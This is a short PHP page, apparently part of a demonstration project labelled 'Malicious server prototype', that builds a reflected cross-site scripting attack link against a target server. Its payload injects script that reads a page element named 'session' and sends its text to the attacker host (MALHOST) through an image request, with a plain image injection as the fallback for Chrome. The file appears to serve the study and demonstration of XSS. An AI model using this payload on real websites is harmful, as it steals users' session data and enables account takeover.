<?php
include('../declare.php');

// Chrome is smart enough to block the reflected JavaScript.
$ua = $_SERVER['HTTP_USER_AGENT'];
if (strpos($ua, 'Chrome') > -1) {
  // So just inject an image.
  $value = urlencode("<img src='".MALHOST."images/attack.png' />");
} else {
  $value = urlencode("<script>var d=document;var e=d.getElementById('session');var i=d.createElement('img');i.src='".MALHOST."images/attack.png?'+encodeURIComponent(e.textContent);e.appendChild(i);</script>");
}

$title = "Malicious server prototype: Reflected XSS";
include('../inc/header.php');
?>
<h1>Reflected XSS</h1>
<p class="instructions">
Clicking on this link will trigger a reflected XSS attack on the target server:
<a href="<?=TGTHOST?>reflected/target?value=<?=$value?>">attack</a>
</p>
<?
$links = array(
  'reflected XSS start' => TGTHOST."reflected/start",
);
include('../inc/footer.php');
?>
